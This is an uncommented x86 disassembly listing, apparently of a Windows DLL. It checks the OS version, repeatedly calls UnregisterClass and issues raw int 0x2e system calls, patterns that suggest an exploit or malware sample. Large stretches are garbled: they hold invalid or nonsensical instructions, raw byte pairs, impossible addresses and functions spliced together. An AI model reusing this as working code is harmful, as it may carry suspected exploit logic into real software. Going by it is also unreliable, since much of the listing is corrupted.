mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
lea edi [ esi + 0x1c ]
push ebx
push 0x4
lea eax [ esi + 0xc ]
push eax
push [ esi + 0x8 ]
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
cmp [ esi + 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x4d ] 0x1
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi + 0x18 ]
cmp [ eax ] ebx
je r-xdata
push ebx
push 0x4
push eax
push ecx
push edi
call sub_1000c492
add esp 0x14
mov [ ebp - 0x20 ] eax
sub_1000a9e7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x1c
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
sub_1000aa69
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea ebx [ edi + 0x1c ]
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ edi + 0x4 ] esi
and [ edi + 0x10 ] 0x0
sub esi [ edi + 0x20 ]
mov [ ebp - 0x24 ] esi
push rw-data
push [ ebx ]
call [ GetProcAddress@IAT ]
mov edx eax
mov [ ebp - 0x28 ] edx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov ebx 0xffbfffff
mov eax [ edi + 0x20 ]
add eax [ ebp - 0x34 ]
mov [ edi + 0x10 ] eax
jmp r-xdata
lea ecx [ eax + edx ]
mov [ ebp - 0x3c ] ecx
mov ecx [ ecx ]
and ecx ebx
mov [ ebp - 0x38 ] ecx
cmp ecx [ ebp - 0x24 ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al 0x1
jmp r-xdata
inc eax
mov [ ebp - 0x30 ] eax
jmp r-xdata
lea edx [ eax + edx + 0x9 ]
mov [ ebp - 0x3c ] edx
mov edx [ edx ]
and edx ebx
mov [ ebp - 0x40 ] edx
mov esi edx
xor esi ecx
test esi 0xfffff000
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x64
jge r-xdata
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x34 ] edx
sub_1000ab6f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38c
push ebx
push esi
push edi
xor ebx ebx
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
push 0x57
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x24 ] eax
lea eax [ esi + 0x200 ]
mov [ ebp - 0x398 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x20 ] bl
mov [ ebp - 0x1f ] bl
push rw-data
call sub_1000c755
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_1000beb7
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push 0xffffffba
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
call sub_10009bd3
pop ecx
test al al
jne r-xdata
push 0xffffffd4
jmp r-xdata
pop eax
or [ ebp - 0x7c ] 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x13c ] ebx
lea eax [ ebp - 0x13c ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_1000b369
pop ecx
pop ecx
test al al
jne r-xdata
push 0xffffffc3
jmp r-xdata
push 0xd
lea eax [ ebp - 0x6c ]
push eax
push 0x7
push sub_1000b0de
push esi
push 0x17
push rw-data
call sub_10009835
mov [ ebp - 0x178 ] esi
mov eax esi
shr eax 0x10
mov [ ebp - 0x384 ] eax
mov edi 0x9c
push edi
push ebx
lea eax [ ebp - 0x134 ]
push eax
call sub_1000d316
add esp 0x28
mov [ ebp - 0x134 ] edi
lea eax [ ebp - 0x134 ]
push eax
call [ GetVersionExA@IAT ]
mov [ ebp - 0x394 ] rw-data
push 0xa
pop edi
mov [ ebp - 0x98 ] edi
cmp [ ebp - 0x130 ] 0x5
jne r-xdata
mov [ ebp - 0x7c ] 0xffffffc1
jmp r-xdata
cmp [ ebp - 0xa0 ] 0x1
jne r-xdata
cmp [ ebp - 0x12c ] 0x1
jne r-xdata
or [ ebp - 0x2 ] 0xffffffff
call sub_1000b1ba
mov eax [ ebp - 0x7c ]
jmp r-xdata
cmp [ ebp - 0xa0 ] 0x2
jne r-xdata
mov [ ebp - 0x8c ] 0xa0
jmp r-xdata
cmp [ ebp - 0xa0 ] bx
jne r-xdata
mov ecx [ ecx - 0x10 ]
cdq
or eax 0x4
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x8c ] 0xa4
push rw-data
lea eax [ ebp - 0x120 ]
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
mov [ ebp - 0x8c ] 0xa0
jne r-xdata
mov [ ebp - 0x16c ] 0x30
mov [ ebp - 0x168 ] ebx
mov [ ebp - 0x164 ] ebx
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x158 ] ebx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x150 ] ebx
mov [ ebp - 0x14c ] ebx
mov [ ebp - 0x148 ] ebx
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x140 ] ebx
lea eax [ ebp - 0x16c ]
mov [ ebp - 0x94 ] eax
movzx eax [ ebp - 0x8c ]
mov [ ebp - 0x39c ] eax
sub esi eax
and esi 0xffff
mov [ ebp - 0x15c ] esi
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
add esp 0xc
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
lea eax [ ebp - 0x380 ]
mov [ ebp - 0x17c ] eax
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x174 ] eax
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x390 ] ebx
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push edi
call sub_1000d316
push 0x10
push ebx
push esi
call sub_1000d316
push 0x8
push ebx
lea eax [ ebp - 0x38c ]
push eax
call sub_1000d316
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x84 ] esi
lea eax [ ebp - 0x38c ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x138 ] eax
mov eax [ ebp + 0x8 ]
add eax 0x500
mov [ ebp - 0x170 ] eax
push 0x8
push 0x1c
push eax
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x38
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x256
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
xor ebx ebx
push ebx
push rw-data
call [ UnregisterClassA@IAT ]
mov eax [ ebp - 0x384 ]
sub eax [ ebp - 0x39c ]
and eax 0xffff
mov [ ebp - 0x15c ] eax
push 0x8
push ebx
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
mov [ ebp - 0x90 ] edi
push 0x10
push ebx
call esi
mov esi eax
mov [ ebp - 0x390 ] esi
push 0x8
push ebx
push edi
call sub_1000d316
push 0x10
push ebx
push esi
call sub_1000d316
mov [ ebp - 0x88 ] edi
mov [ ebp - 0x84 ] esi
push rw-data
lea eax [ ebp - 0x380 ]
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x380 ]
push eax
call [ wcslen@IAT ]
shl eax 0x1
mov [ ebp - 0x180 ] ax
mov [ ebp - 0x17e ] 0x200
push 0x8
push 0x1c
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
add esp 0x38
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x80
push 0x257
push [ ebp - 0x138 ]
push [ ebp - 0x174 ]
push [ ebp - 0x174 ]
push [ ebp - 0x94 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0x170 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
push rw-data
call [ UnregisterClassA@IAT ]
push 0x8
push 0x1c
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
push [ ebp - 0x13c ]
call sub_1000c640
add esp 0x18
test al al
jne r-xdata
mov [ ebp - 0x8c ] 0xa4
jmp r-xdata
push eax
push ebx
push ecx
push edx
push esi
push edi
push 0x0
push 0x1f
push 0x0
push 0x0
push 0x0
push 0x600
push [ ebp + 0xc ]
mov eax [ esp + ecx * 4 - 0x1 ]
xchg esp eax
sar dh 0x1
sti
dec [ ecx + 0x5e5f8445 ]
pop edx
pop ecx
pop ebx
pop eax
push 0x0
call 0x1100c640
pop ecx
cmp [ ebp - 0x7c ] 0x0
jne r-xdata
mov [ ebp - 0x7c ] 0xffffffc3
jmp r-xdata
mov [ ebp - 0x394 ] rw-data
mov [ ebp - 0x98 ] edi
xor ebx ebx
cmp [ edi - 0x40 ] 0x0
je r-xdata
mov [ ebp - 0x7c ] 0xfffb5fc0
imul eax [ edi ] 0xffffff8d
inc esp
adc al 0x50
push 0x1
push sub_1000b1d2
push [ ebp - 0x398 ]
push 0x11
push rw-data
call sub_10009835
push 0x8
push 0x4
push [ ebp - 0x170 ]
push 0xa
push [ ebp - 0x394 ]
call sub_10009898
push [ ebp - 0x40013c ]
call sub_1000c640
add esp 0x34
test al al
je r-xdata
xchg [ ebp - 0x7c ] ecx
call [ eax + 0x53 ]
push ecx
push edx
push esi
push edi
push 0x64
mov eax [ ebp - 0x1c ]
call [ ecx - 0x170 ]
or [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0xffffff80
call sub_1000c640
pop ecx
mov al [ 0x7500e17d ]
pop es
sub_1000b0de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
aaa
fisttp [ ecx + 0x758bfc5d ]
or [ ebx + 0x388b0546 ] cl
mov [ ebp - 0x28 ] edi
mov eax [ esi + 0x50 ]
lea eax [ edi + eax * 4 ]
mov [ esi + 0x8 ] eax
mov ecx [ eax ]
mov [ esi + 0xc ] ecx
lea ecx [ esi + 0x40 ]
lea edx [ esi + 0x1c ]
push ebx
push 0xc
push ecx
push eax
push edx
call sub_1000c492
xchg esp eax
adc al 0x89
inc ebp
aam 0x3b
retn
sub_1000b195
mov esp [ ebp - 0x18 ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] bl
lea edi [ esi + 0x18 ]
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0x4 ]
mov [ ebp - 0x24 ] ecx
cmp ecx ebx
je r-xdata
mov [ esi + 0x4c ] 0x1
xor eax edx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
xor eax ecx
test eax 0xbefff000
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add [ ecx ] 0xffffff89
inc ebp
sar [ edi ] 0x1
sub_1000b1d2
push ebp
mov ebp esp
push 0xffffffff
push r--data
push 0x3000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push esi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0x8 ]
cmp esi 0xa
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
call sub_1000b249
push esi
call sub_1000b2e7
push [ esi ]
enter 0x76ff 0x44
lea eax [ esi + 0x1c ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
sti
push cs
push 0x1
pop eax
retn
mov eax 0xc00000e1
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b249
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x100103 ]
push eax
mov [ fs : 0x0 ] ah
add ebp esp
adc [ ebx + 0x56 ] dl
push edi
mov [ ebp - 0x16 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x8 ]
test [ esi + 0x1c ] edi
push ecx
push 0x4
lea eax [ esi + 0xc ]
push eax
push [ esi + 0x8 ]
push edi
cmp [ esi + 0x10 ] ebx
je r-xdata
xchg ebx eax
dec ebp
cld
mov [ esi + 0x4d ] 0x11
or [ ebp - 0x8 ] 0xffffffff
xor edx eax
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx ebx
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
enter 0x55c3 0x8f
in al dx
push 0xfffffffb
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x3 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx eax
cmp [ ecx - 0x377a1fb3 ] cl
je r-xdata
lea eax [ esi + 0x18 ]
cmp [ eax ] edx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
aaa
shr bl 0xe
push 0x1
pop eax
retn
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x1c
push eax
call sub_1000c392
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
shr [ edx + 0x4 ] cl
push eax
push ecx
push edi
call sub_1000c492
add esp 0x14
cdq
inc ebp
loopne r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
call sub_1000c492
xchg ebx eax
in al 0x14
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
inc esi
dec ebp
adc [ ebx + 0x33fff84d ] eax
shr bl 0x1
push cs
push 0x1
pop eax
ror [ ebx + 0x4d83e865 ] 0xf4
[ edx - 0x2b ]
mov ecx [ ebp - 0x10 ]
mov [ fs : rw-data ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b369
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov edi [ ebp + 0x8 ]
test edi edi
das
test ah al
add [ eax + eax ] al
cmp [ ebp + 0xc ] 0x2
je r-xdata
xor al al
fwait
dec ebp
clc
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
lea ebx [ edi + 0x1c ]
push rw-data
push ebx
call sub_10009b69
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
push 0x40
add eax 0xe8531001
mov al [ 0x59ffffe7 ]
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ edi + 0x4 ] esi
and [ edi + 0x10 ] 0x0
sub esi [ edi + 0x20 ]
mov [ ebp - 0x24 ] esi
push rw-data
push [ edi ]
mov edi 0xe11c15
adc [ ebx - 0x27aa7630 ] cl
xor eax [ eax - 0x7603b877 ]
inc ebp
int3
sub_1000b46f
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp esi ebx
push edi
jl r-xdata
outsb
push edi
pop eax
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x84 ] eax
pop [ ebp + 0x18 ]
mov [ ebp - 0x80 ] eax
lea eax [ ebp + 0x14 ]
push ecx
lea eax [ ebp + 0x10 ]
push eax
mov [ ebp - 0x58 ] bl
call sub_1000beb7
pop ecx
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x7c ]
jo r-xdata
push 0xffffffd4
jmp 0xffffffff9000b6d1
test al 0xe8
test [ ecx ] 0x0
add [ ecx - 0x7b ] bl
rcr [ ecx + 0x74 ] 0x7
cld
out 0xff al
dec [ ebp - 0x48779 ]
[ edx + 0xd ]
sub_1000b4df
push eax
push 0x7
push r-xdata
push esi
push 0x17
push rw-data
clc
inc ecx
jecxz r-xdata
dec [ ebp - 0x397e53bb ]
push 0x89ffffff
inc ebp
sbb [ ebp - 0x6877b ] cl
inc [ ecx + 0xffffe6 ]
add al ch
hlt
sub_1000b5cd
push [ ebp + 0x18 ]
mov edx esp
int 0x2e
add esp 0x18
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
xor ebx ebx
push ebx
push rw-data
call [ UnregisterClassW@IAT ]
mov eax [ ecx + 0x8 ]
shr eax 0x10
sub eax 0x98
and eax 0xffff
mov esi [ 0x1002e0c4 ]
push 0x8
push ebx
mov [ ebp - 0x42 ] eax
call esi
push 0x10
push ebx
mov edi eax
call esi
sub cl [ eax ]
push ebx
push edi
mov esi eax
call sub_1000d316
push 0x10
rcl [ esi - 0x18 ] cl
sbb al 0x1
add [ ebp - 0x2877b ] cl
[ eax - 0x38 ]
sub_1000b6d7
push ebp
mov ebp esp
push 0xffffffff
push r--data
push 0x1000d600
mov [ fs : 0x4000000 ] eax
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x30 ] 0x1
push [ eax + 0x28 ]
push [ eax + 0x4 ]
lea ecx [ eax + 0xc ]
push ecx
call [ eax ]
add esp 0xc
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ fs : 0x0 ]
pop edi
pop esi
pop ebx
leave
retn
sub_1000b73a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push 0x1100c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2e4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
aaa
fstp [ ebx ]
je r-xdata
push 0x57
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
dec edi
pop esi
pop ebx

cmp [ ebp + 0xc ] ebx
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
je 0x1080bc0e
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov [ esi + 0x10200 ] es
add [ ebp - 0x2f4 ] 0x88d04589
pop ebp
fmul [ eax + 0x4dc6dd5d ]
movsb [ edi ] [ esi ]
0x4d88c88a 0x8ba5
sub_1000baca
push [ ebp - 0x200000d4 ]
push [ ebp - 0x2094 ]
mov eax [ ebp - 0x78 ]
call [ ebp - 0xd0 ]
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
outsb
add [ eax - 0x48 ] ch
add al 0x1
adc bh bh
adc eax UnregisterClassA@IAT
push 0x8
0x30b5ff1c 0xffff
sub_1000bbb2
inc [ ebx + 0x50ff844d ]
adc edx [ ebp + 0x52 ]
push esi
push edi
push 0x64
mov eax [ ebp - 0x20 ]
call [ ebp - 0xd0 ]
mov [ ebp - 0x7c ] eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
push 0x0
enter 0xa68 0x10
add [ ebp - 0x3f ] bl
jge r-xdata
push ebp
push edx
add [ ebp + 0x7 ] dh
mov [ ebp - 0x7c ] 0xffffffc0
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
call 0x1002bbf8
mov eax [ ebp - 0x7c ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
dec edi
pop esi
pop ebx

sub_1000bca8
adc eax 0xff6aec8b
push r--data
push sub_1000c600
mov eax [ fs : 0x200 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push edi
push edx
push ebp
mov [ ebp - 0x20 ] esp
mov esi ebp
or bl al
dec [ eax ]
jae r-xdata
and [ ebp - 0x4 ] 0x0
push esi
0x38 0xe856
mov eax 0xc0400061
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bce9
lodsb [ esi ]
add [ eax ] al
push eax
je r-xdata
push [ esi + 0x40 ]
lea eax [ esi + 0x18 ]
push eax
call [ esi ]
add esp 0x14
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
and eax 0x0
sub esp 0x10
push edi
push edx
push ebp
mov [ ebp - 0x20 ] esp
mov esi ebp
or bl al
dec [ eax ]
jae r-xdata
and eax 0x4
sub esp 0x10
adc edx [ esi + 0x57 ]
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push 0x0
push 0x8
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x8 ]
push eax
push [ esi + 0x4 ]
lea eax [ esi + 0x18 ]
push eax
call sub_1000c4d2
mov eax esp
adc al 0x89
inc ebp
loopne r-xdata
mov ebx [ ebp - 0x8 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push esi
0x38 0xe856
mov eax 0xc0400061
jmp r-xdata
add bh bh
jbe r-xdata
shl [ esi + eax * 2 - 0x7d ] 0x4d
cld
sub_1000bd99
push ecx
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x14 ] esp
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xe ]
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x20 ] ecx
vpcmpeqb xmm4 xmm6 [ esi ]
mov [ ebp - 0x24 ] 0xeb
push 0x0
push 0x1
lea edx [ ebp - 0x24 ]
push edx
push ecx
add eax 0x10
push eax
call sub_1000c492
add esp 0x14
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
jmp r-xdata
or [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov ecx [ ebp - 0xe ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
sub_1000be1b
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
test esi esi
je r-xdata
xor al al
pop edi
pop esi
pop ebx
rcl [ ebp - 0x75 ] cl
in al dx
mov [ 0x146a14ec ] eax
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_1000d316
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x9 ]
call 0x1200bfba
add esp 0x14
test eax eax
jne r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x13 ]
mov [ ecx ] edx
mov ecx [ 0xfffffffff0558950 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov ecx [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
lea edi [ esi + 0x18 ]
push 0x8010514
push edi
call sub_10009b69
mov ebx eax
pop ecx
add eax 0x1e7459db
push rw-data
push edi
call 0x8ff89b69
pop ecx
test edx eax
pop ecx
je r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
mov [ esi + 0x4 ] ebx
sub_1000be67
push ebp
mov ebp esp
mov [ 0x146a14ec ] eax
lea eax [ ebp - 0x14 ]
push 0x0
push eax
call sub_1000d316
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x9 ]
call 0x1200bfba
add esp 0x14
test eax eax
jne r-xdata
leave
retn
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x13 ]
mov [ ecx ] edx
mov ecx [ 0xfffffffff0558950 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ ecx ] edx
mov ecx [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x1c ]
mov edx [ ebp - 0x4 ]
mov [ ecx ] edx
sub_1000bed0
test esi esi
pop ecx
je r-xdata
push 0xffffffd4
pop eax
dec esi
retn
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
inc eax
inc esi
mov [ ecx ] eax
mov eax [ esp + 0xc ]
mov [ eax ] esi
xor edx eax
pop esi
retn
sub_1000bef2
in al dx
push 0xffffffff
push 0x1008eeb8
push r--data
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x20 ] esp
sub esp 0x1e
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push rw-data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x1c ] eax
xor ebx ebx
cmp eax ebx
je r-xdata
xor eax [ eax - 0x75 ]
dec ebp
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x8 ]
push eax
call [ r--data ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x24 ] ebx
xor esi esi
jmp r-xdata
mov [ ecx - 0x4 ] ebx
jmp r-xdata
sbb [ eax ] 0xb8
jne r-xdata
push 0xffffffff
lea eax [ eax + esi * 8 + 0x50 ]
call _local_unwind2
pop ecx
pop ecx
mov eax esi
sub eax 0x0
jmp r-xdata
cmp [ eax + 0x3 ] bl
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
pushad
mov [ 0x0 ] ebp
inc eax
mov [ ebp - 0x20 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
cmp [ eax + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x24 ] 0xa
jge r-xdata
inc eax
mov [ ebp - 0x2c ] eax
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov esi eax
sub_1000c11a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x10
push ebx
lea eax [ ebp - 0x2c ]
push eax
call sub_1000d316
lea eax [ ebp - 0x2c ]
push eax
jmp [ ebp + 0x8 ]
sub_1000c367
push ebp
mov edi esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
out dx eax
jne r-xdata
pop ebp
retn
push [ ebp + 0x18 ]
push [ edi + 0x14 ]
push [ ebp + 0x8 ]
call 0x1400c3d0
mov ecx [ ebp + 0xc ]
add esp 0x18
test ecx ecx
mov [ ecx ] eax
jge r-xdata
lea ecx [ ebp + 0x20 ]
push ecx
push eax
std
jne r-xdata
mov eax ecx
and [ ebx ] ch
inc ebp
and al 0xff
jne r-xdata
push [ ebp + 0x8 ]
call sub_1000c454
add esp 0x10
test eax eax
cmc
push [ es : ebp + 0x1c ]
mov eax [ ebp + 0x20 ]
sub eax [ ebp + 0x24 ]
push [ ebp + 0x18 ]
cmp eax eax
push eax
push [ ebp + 0x8 ]
call 0x1080cb87
imul eax eax 0x64
cdq
